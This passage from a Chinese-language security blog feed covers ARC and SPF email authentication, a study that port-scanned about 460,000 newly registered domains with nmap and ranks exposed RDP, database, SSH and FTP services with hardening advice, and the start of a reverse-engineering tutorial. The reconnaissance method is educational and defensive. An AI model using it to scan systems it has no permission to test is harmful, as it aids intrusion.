&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    header.i=@example.org; dmarc=fail; &lt;/span&gt;&lt;br&gt;&lt;mark class=&quot;highlight-line highlight-line-active&quot;&gt;    arc=pass (as.1.lists.example.org=pass, ams.1.lists.example.org=pass)  &lt;/mark&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;ARC-Seal: i=1; a=rsa-sha256; cv=none; d=lists.example.org; s=dk-   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    lists; t=12345; b=TlCCKzgk3TrAa+G77gYYO8Fxk4q/Ml0biqduZJeOYh6+  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    0zhwQ8u/lHxLi21pxu347isLSuNtvIagIvAQna9a5A==  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    lists.example.org; h=message-id:date:from:to:subject; s=dk-    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    lists; t=12345; bh=KWSe46TZKCcDbH4klJPo+tjk5LWJnVRlP5pvjXFZYL  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    Q=; b=DsoD3n3hiwlrN1ma8IZQFgZx8EDO7Wah3hUjIEsYKuShRKYB4LwGUiKD5Y  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    yHgcIwGHhSc/4+ewYqHMWDnuFxiQ==  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;ARC-Authentication-Results: i=1; lists.example.org; spf=pass  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    smtp.mfrom=jqd@d1.example; dkim=pass (512-bit key)  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    header.i=@d1.example; dmarc=pass&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;%E5%B0%8F%E7%B5%90&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%B0%8F%E7%B5%90&quot;&gt;#&lt;/a&gt; 小結&lt;/h3&gt;
&lt;p&gt;雖然 ARC 用數位簽章的方式做擔保，看似解決了 Indirect Mail Flow 的問題，但他並不是萬靈丹。畢竟 ARC 只是提供更多資訊讓最終收信端可以看到中間『隱形的部分』，並不能保證每一個經過的 mediator 都是值得信任的。&lt;/p&gt;
&lt;p&gt;再者，對 mail server 而言 ARC 只是參考指標（MAY … consult … ARC），無論結果如何，mail server 都可以只採用本身 DMARC 驗證的結果決定信件去留，並不一定要採納 ARC。&lt;/p&gt;
&lt;p&gt;關於 ARC 的許多細節都還有待討論，未來也許會加入其他規範讓這個機制更加完整，更多資訊可以參考 &lt;a href=&quot;http://arc-spec.org/&quot;&gt;ARC-spec&lt;/a&gt; 跟 &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc8617&quot;&gt;RFC8617&lt;/a&gt;。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;q6&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#q6&quot;&gt;#&lt;/a&gt; Q6: 常常看到 SPF 用 &lt;code&gt;~all&lt;/code&gt; 而不是 &lt;code&gt;-all&lt;/code&gt;，有什麼差？&lt;/h2&gt;
&lt;p&gt;前面在 SPF 設定篇提過有四種 qualifier，這邊貼過來一遍：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;pass(+)&lt;/code&gt;：若對到 sender-ip，結果 pass（即白名單）。預設值，可以省略（ &lt;code&gt;+all&lt;/code&gt; 同 &lt;code&gt;all&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;neutral(?)&lt;/code&gt;：None ，等同沒有 policy。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;softfail(~)&lt;/code&gt;：若對到 sender-ip，結果 fail，仍要標注並接受。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;fail(-)&lt;/code&gt;：若對到 sender-ip，結果 fail（即黑名單）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中，對 &lt;code&gt;all&lt;/code&gt; 機制而言最常出現的是 &lt;code&gt;softfail(~all)&lt;/code&gt; 跟 &lt;code&gt;fail(-all)&lt;/code&gt;。單以 SPF 來說，這兩個的區別明顯就是指示收信的 mail server『雖然我們都是 fail，但請保留 softfail 的』。不過在有設定跟使用 DMARC 的情況下，最後 MDA 只會根據 DMARC 判定的 policy 來決定採取的行為，因為 &lt;code&gt;softfail&lt;/code&gt; 跟 &lt;code&gt;fail&lt;/code&gt; 都對 DMARC 給出了 fail 的結果，所以他們其實是等價的。只有在單獨使用 SPF 驗證的時候，&lt;code&gt;softfail&lt;/code&gt; 跟 &lt;code&gt;fail&lt;/code&gt; 的差別才會造成影響。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;references%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#references%3A&quot;&gt;#&lt;/a&gt; References:&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Email_forwarding&quot;&gt;Email Forwarding — Wikipedia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc7960#section-2&quot;&gt;RFC7960&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc5598#section-5&quot;&gt;RFC5598&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc8617&quot;&gt;RFC8617&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

		</content>
	</entry>
	
	<entry>
		<title>為什麼網站才剛上線就被攻擊？</title>
		<link href="https://tech-blog.cymetrics.io/posts/nick/website-go-live-attack/"/>
		<updated>2021-07-23T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/nick/website-go-live-attack/</id>
		<content type="html">
		  &lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/website-go-live-attack/1.jpg&quot; alt=&quot;Photo by Arget on Unsplash&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;!-- summary --&gt;
&lt;!-- 剛出生的嬰兒最好欺負，網站也是一樣，網站初建時不管是為了方便測試或維護，都會對外開放較多的服務，駭客也容易在此時趁虛而入。本文將介紹從這些剛上線的網站中整理出的 5 種最常見卻有弱點的服務。--&gt;
&lt;!-- summary --&gt;
&lt;p&gt;剛出生的嬰兒最好欺負，網站也是一樣，網站初建時不管是為了方便測試或維護，都會對外開放較多的服務，駭客也容易在此時趁虛而入。&lt;br&gt;
本文會先簡單介紹一下駭客如何找到新建立的網站，並實測一下這個方法可以找出多少 7 天內架設的網站，再從這些網站的掃描結果中整理出 5 種最常見且有弱點的服務，並討論一下弱點可能帶來的風險與防範方式 。&lt;/p&gt;
&lt;h2 id=&quot;%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%B4%B9&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%B4%B9&quot;&gt;#&lt;/a&gt; 工具介紹&lt;/h2&gt;
&lt;p&gt;這邊介紹兩個測試中用到的工具，第一個工具整理了每天有哪些人來申請新的網域，因為新網域上大多也是新建立的網站，所以這些網域上的網站就是我們的測試對象。另外一個工具則是去掃描這些網站開放了那些服務。&lt;/p&gt;
&lt;h3 id=&quot;1.-whois-data-center&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#1.-whois-data-center&quot;&gt;#&lt;/a&gt; 1. Whois Data Center&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/website-go-live-attack/2.jpg&quot; alt=&quot;Photo by Arget on Unsplash&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;%E7%B0%A1%E4%BB%8B-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B0%A1%E4%BB%8B-%3A&quot;&gt;#&lt;/a&gt; 簡介 :&lt;/h3&gt;
&lt;p&gt;Whois Data Center 收集了從 1985 年以來全球 Whois 資料庫的數據，更重要的是將些龐大的數據整理與分門別類，像是新註冊的網域、即將過期的網域、已經刪除的網域等等，可惜的是大部份功能與資料都要收費。&lt;/p&gt;
&lt;h3 id=&quot;%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AD%98-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AD%98-%3A&quot;&gt;#&lt;/a&gt; 背景知識 :&lt;/h3&gt;
&lt;h4 id=&quot;%E7%B6%B2%E5%9F%9F(domain-)%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B6%B2%E5%9F%9F(domain-)%3A&quot;&gt;#&lt;/a&gt; 網域(Domain ):&lt;/h4&gt;
&lt;p&gt;在網路的世界中，網站會有一組 IP 位址，使用者可在瀏覽器輸入 IP 位址來找到對應的網站。不過 IP 位址是一組不容易記憶的數字。為了讓瀏覽網站更容易，網域的概念便應運而生，簡單一點說就是平常在網址列看到的最前面一段(ex. &lt;a href=&quot;http://google.com/&quot;&gt;google.com&lt;/a&gt;)。&lt;/p&gt;
&lt;h4 id=&quot;whois-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#whois-%3A&quot;&gt;#&lt;/a&gt; Whois :&lt;/h4&gt;
&lt;p&gt;網站在申請網域後，負責管理 Domain與 IP 的註冊商會依照 ICANN(註 1) 的規定將資訊公開在 Whois 資料庫。Whois 是非集中管理式的資料庫，註冊數據保存在不同的位置，並由複數註冊商共同管理，所有人都可以藉由 Whois 查詢到域名的擁有者與聯繫信息，聯繫信息中包括郵寄地址、電話號碼和電子郵件。&lt;/p&gt;
&lt;h3 id=&quot;%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F-%3A&quot;&gt;#&lt;/a&gt; 使用方式 :&lt;/h3&gt;
&lt;p&gt;這次我們會用到的是新註冊的網域，在 Whois Data Center 最近 7 天的新註冊網域資料是免費的，任何人都可以下載，包含駭客。&lt;br&gt;
下載位置 : &lt;a href=&quot;https://whoisdatacenter.com/free-database&quot;&gt;https://whoisdatacenter.com/free-database&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;2.-nmap&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#2.-nmap&quot;&gt;#&lt;/a&gt; 2. NMAP&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/website-go-live-attack/3.jpg&quot; alt=&quot;Photo by Arget on Unsplash&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;%E7%B0%A1%E4%BB%8B-%3A-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B0%A1%E4%BB%8B-%3A-2&quot;&gt;#&lt;/a&gt; 簡介 :&lt;/h3&gt;
&lt;p&gt;NMAP(Network Mapper)是一款開源的網絡探測和安全審核的工具。它的設計目標是快速地掃描大型網路。NMAP的功能非常豐富光介紹就可以寫數篇文章，所以這邊只著重在測試中有用到的功能。&lt;/p&gt;
&lt;h3 id=&quot;%E5%AE%89%E8%A3%9D%E6%96%B9%E5%BC%8F-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%AE%89%E8%A3%9D%E6%96%B9%E5%BC%8F-%3A&quot;&gt;#&lt;/a&gt; 安裝方式 :&lt;/h3&gt;
&lt;p&gt;Linux(Debain) 系統可參考下列命令安裝，Windows 則需從到官網下載安裝檔。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get install nmap
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F-%3A-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F-%3A-2&quot;&gt;#&lt;/a&gt; 使用方式 :&lt;/h3&gt;
&lt;p&gt;NMAP 預設會掃最常見的 1000 個 Port，T4 與 sS 都是加速掃描的選項。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap -T4 -sS example.com
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;%E5%AF%A6%E4%BE%8B%E5%88%86%E4%BA%AB&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%AF%A6%E4%BE%8B%E5%88%86%E4%BA%AB&quot;&gt;#&lt;/a&gt; 實例分享&lt;/h2&gt;
&lt;p&gt;從 Whois Data Center 收集來一週內新註冊網域來當測試對象，實際上總共找到了約 46 萬個不同的網域，接著用 NMAP 對所有找出來的網域進行 Port Scan，最後從結果中整理出 5 個新網站最常見且有弱點的服務，排名方式以網站數量為準。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;no.5-rdp&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#no.5-rdp&quot;&gt;#&lt;/a&gt; NO.5 RDP&lt;/h3&gt;
&lt;h4 id=&quot;1.-%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-7147(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-1.6%25)%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#1.-%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-7147(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-1.6%25)%E3%80%82&quot;&gt;#&lt;/a&gt; 1. 網站數量 : 7147(約佔總數 1.6%)。&lt;/h4&gt;
&lt;h4 id=&quot;2.-%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#2.-%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6%E3%80%82&quot;&gt;#&lt;/a&gt; 2. 服務類型 : 遠端控制。&lt;/h4&gt;
&lt;h4 id=&quot;3.-%E5%B0%8D%E5%A4%96-port-%3A-3389%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#3.-%E5%B0%8D%E5%A4%96-port-%3A-3389%E3%80%82&quot;&gt;#&lt;/a&gt; 3. 對外 Port : 3389。&lt;/h4&gt;
&lt;h4 id=&quot;4.-%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#4.-%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A&quot;&gt;#&lt;/a&gt; 4. 弱點說明 :&lt;/h4&gt;
&lt;p&gt;RDP(Remote Desktop Protocol) 是 Windows 內建的遠端控制功能，特點之一是會把登入過的使用者帳號顯示出來，這大幅降低了駭客暴力破解難度，用 Windows Server 來架站比較常出現這個問題。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;no.4.-postgresql-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#no.4.-postgresql-%3A&quot;&gt;#&lt;/a&gt; NO.4. PostgreSQL :&lt;/h3&gt;
&lt;h4 id=&quot;1.-%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-31983-(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-7.0%25)%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#1.-%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-31983-(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-7.0%25)%E3%80%82&quot;&gt;#&lt;/a&gt; 1. 網站數量 : 31983 (約佔總數 7.0%)。&lt;/h4&gt;
&lt;h4 id=&quot;2.-%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E8%B3%87%E6%96%99%E5%BA%AB%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#2.-%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E8%B3%87%E6%96%99%E5%BA%AB%E3%80%82&quot;&gt;#&lt;/a&gt; 2. 服務類型 : 資料庫。&lt;/h4&gt;
&lt;h4 id=&quot;3.-%E5%B0%8D%E5%A4%96-port-%3A-5432%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#3.-%E5%B0%8D%E5%A4%96-port-%3A-5432%E3%80%82&quot;&gt;#&lt;/a&gt; 3. 對外 Port : 5432。&lt;/h4&gt;
&lt;h4 id=&quot;4.-%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#4.-%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-2&quot;&gt;#&lt;/a&gt; 4. 弱點說明 :&lt;/h4&gt;
&lt;p&gt;PostgreSQL 是一個強大的開源資料庫，一般狀況下該資料庫限制只有本地機器才可存取，但有些人為了方便將其對外開放，對外開放就要特別注意暴力破解的風險跟禁用預設帳號。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;no-3.-mysql-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#no-3.-mysql-%3A&quot;&gt;#&lt;/a&gt; No 3. MySQL :&lt;/h3&gt;
&lt;h4 id=&quot;%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-38458(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-8.3%25)%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-38458(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-8.3%25)%E3%80%82&quot;&gt;#&lt;/a&gt; 網站數量 : 38458(約佔總數 8.3%)。&lt;/h4&gt;
&lt;h4 id=&quot;%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E8%B3%87%E6%96%99%E5%BA%AB%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E8%B3%87%E6%96%99%E5%BA%AB%E3%80%82&quot;&gt;#&lt;/a&gt; 服務類型 : 資料庫。&lt;/h4&gt;
&lt;h4 id=&quot;%E5%B0%8D%E5%A4%96-port-%3A-3306%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%B0%8D%E5%A4%96-port-%3A-3306%E3%80%82&quot;&gt;#&lt;/a&gt; 對外 Port : 3306。&lt;/h4&gt;
&lt;h4 id=&quot;%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A&quot;&gt;#&lt;/a&gt; 弱點說明 :&lt;/h4&gt;
&lt;p&gt;MySQL 是老牌且有著高市佔率的資料庫，危險的地方在於預設帳號 root 的密碼是空白，資料庫安裝時如果沒有改設定又對外開放，駭客有機會長驅直入。&lt;/p&gt;
&lt;h4 id=&quot;%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A&quot;&gt;#&lt;/a&gt; 修復建議 :&lt;/h4&gt;
&lt;p&gt;資料庫安裝完畢後盡快移除 root 帳號，否則就算沒有使用空密碼也有被暴力破解的風險，另外建議限制 IP 來源，下方範例為更改所有現有的用戶只能從指定 IP 登錄。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;no-2.-ssh-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#no-2.-ssh-%3A&quot;&gt;#&lt;/a&gt; No 2. SSH :&lt;/h3&gt;
&lt;h4 id=&quot;%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-65041(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-14.1%25)%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-65041(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-14.1%25)%E3%80%82&quot;&gt;#&lt;/a&gt; 網站數量 : 65041(約佔總數 14.1%)。&lt;/h4&gt;
&lt;h4 id=&quot;%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6%E3%80%82&quot;&gt;#&lt;/a&gt; 服務類型 : 遠端控制。&lt;/h4&gt;
&lt;h4 id=&quot;%E5%B0%8D%E5%A4%96-port-%3A-22%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%B0%8D%E5%A4%96-port-%3A-22%E3%80%82&quot;&gt;#&lt;/a&gt; 對外 Port : 22。&lt;/h4&gt;
&lt;h4 id=&quot;%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-2&quot;&gt;#&lt;/a&gt; 弱點說明 :&lt;/h4&gt;
&lt;p&gt;SSH 是遠端控制最常見的方法，協議本身安全性很夠，但帳號密碼強度太弱時還是很危險，越常見的功能也越常被駭客盯上。&lt;/p&gt;
&lt;h4 id=&quot;%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A-2&quot;&gt;#&lt;/a&gt; 修復建議 :&lt;/h4&gt;
&lt;p&gt;改用公私鑰登入，駭客偷鑰匙難度比猜密碼難度難上太多了，已經有很多人分享過了，就不重複介紹。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;no-1.-ftp-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#no-1.-ftp-%3A&quot;&gt;#&lt;/a&gt; No 1. FTP :&lt;/h3&gt;
&lt;h4 id=&quot;%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-77899(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-16.9%25)%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-77899(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-16.9%25)%E3%80%82&quot;&gt;#&lt;/a&gt; 網站數量 : 77899(約佔總數 16.9%)。&lt;/h4&gt;
&lt;h4 id=&quot;%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E6%AA%94%E6%A1%88%E5%82%B3%E8%BC%B8%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E6%AA%94%E6%A1%88%E5%82%B3%E8%BC%B8%E3%80%82&quot;&gt;#&lt;/a&gt; 服務類型 : 檔案傳輸。&lt;/h4&gt;
&lt;h4 id=&quot;%E5%B0%8D%E5%A4%96-port-%3A-21%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%B0%8D%E5%A4%96-port-%3A-21%E3%80%82&quot;&gt;#&lt;/a&gt; 對外 Port : 21。&lt;/h4&gt;
&lt;h4 id=&quot;%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-3&quot;&gt;#&lt;/a&gt; 弱點說明 :&lt;/h4&gt;
&lt;p&gt;FTP 是最常用的檔案傳輸協議，但它本身的安全性不足，不管是傳輸或登入皆使用明碼傳輸，有很高的資料外洩風險，更不用說 FTP 還支援無帳密登入(anyoneuser)，FTP 傳檔雖方便但真的不適合對外開放。&lt;/p&gt;
&lt;h4 id=&quot;%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A-3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A-3&quot;&gt;#&lt;/a&gt; 修復建議 :&lt;/h4&gt;
&lt;p&gt;如有對外需求改用 SFTP 或其他有權限控管的檔案傳輸方案，否則盡快關閉對外的 FTP 服務。&lt;/p&gt;
&lt;h2 id=&quot;%E7%B8%BD%E7%B5%90&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B8%BD%E7%B5%90&quot;&gt;#&lt;/a&gt; 總結&lt;/h2&gt;
&lt;p&gt;現在越來越多人將網站架在雲上，減少維運成本的同時還可以讓 CSP 業者幫你把關資安問題，但不管怎麼把關也阻止不了你自己開洞給駭客鑽，網站架在雲上用到遠端服務的機會很多，多花一些時間了解該服務並進行安全性設定，這樣才能保證，不管是資安還是品質，我全都要。&lt;/p&gt;
&lt;p&gt;這些問題在成熟的網站上比較少見，因為在網站穩定後大多會關閉這些對外服務，但駭客也知道這個狀況，盯著新建的網站攻擊，想辦法在架站初期植入後門，之後就算網站穩定後關閉對外服務，後門也不會跟著消失。&lt;/p&gt;
&lt;p&gt;這 5 個常見問題不以弱點的嚴重程度來排名是因為其安全性與設定完善程度有關，實際測試的過程中有部分的網站已經有做好安全性設定，駭客實際上是打不進去的，但也有找到部分網站使用預設帳號密碼，甚至是開放無帳密登入，這類網站受到攻擊的機率非常高，如果擔心自己的網站也屬於這一類的話，還未上線的網站可用前面提到的 NMAP 指令在內網進行測試，已上線的網站可以參考前一篇文章用 Shodan 或 FOFA 從外網進快速進行檢測。&lt;/p&gt;
&lt;p&gt;文章連結 : &lt;a href=&quot;https://medium.com/cymetrics/shodan-fofa-e7e69702923d&quot;&gt;駭客的起手式工具 : Shodan &amp;amp; Fofa&lt;/a&gt;&lt;/p&gt;

		</content>
	</entry>
	
	<entry>
		<title>Reverse Engineering 101 — Part 2</title>
		<link href="https://tech-blog.cymetrics.io/posts/crystal/reverse-02/"/>
		<updated>2021-07-30T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/crystal/reverse-02/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;!-- 逆向小白帶著滿箱的知識，準備正式開始拆解小程式啦！ --&gt;
&lt;!-- summary --&gt;
&lt;p&gt;part 1 傳送門：&lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/reverse-01&quot;&gt;&lt;strong&gt;Reverse Engineering 101 — Part 1&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;熬過了基礎知識的建立，接下來我們來分析一下程式的邏輯吧！&lt;/p&gt;
&lt;h2 id=&quot;%E4%BA%8B%E4%B8%8D%E5%AE%9C%E9%81%B2%EF%BC%8C%E5%BF%AB%E5%BF%AB%E9%96%8B%E5%A7%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E4%BA%8B%E4%B8%8D%E5%AE%9C%E9%81%B2%EF%BC%8C%E5%BF%AB%E5%BF%AB%E9%96%8B%E5%A7%8B&quot;&gt;#&lt;/a&gt; 事不宜遲，快快開始&lt;/h2&gt;
&lt;p&gt;首先先給大家看一下 &lt;code&gt;disas main&lt;/code&gt; 的完整結果。&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;Dump of assembler code for function main:&lt;br&gt;   0x0000000000400b1e &amp;lt;+0&gt;:	    push   rbp&lt;br&gt;   0x0000000000400b1f &amp;lt;+1&gt;:	    mov    rbp,rsp&lt;br&gt;   0x0000000000400b22 &amp;lt;+4&gt;:	    sub    rsp,0x20&lt;br&gt;   0x0000000000400b26 &amp;lt;+8&gt;:	    mov    DWORD PTR [rbp-0xc],0x0&lt;br&gt;   0x0000000000400b2d &amp;lt;+15&gt;:	mov    DWORD PTR [rbp-0x10],0x0&lt;br&gt;   0x0000000000400b34 &amp;lt;+22&gt;:	mov    DWORD PTR [rbp-0x14],0x0&lt;br&gt;   0x0000000000400b3b &amp;lt;+29&gt;:	mov    esi,0x400cd0&lt;br&gt;   0x0000000000400b40 &amp;lt;+34&gt;:	mov    edi,0x6021a0&lt;br&gt;   0x0000000000400b45 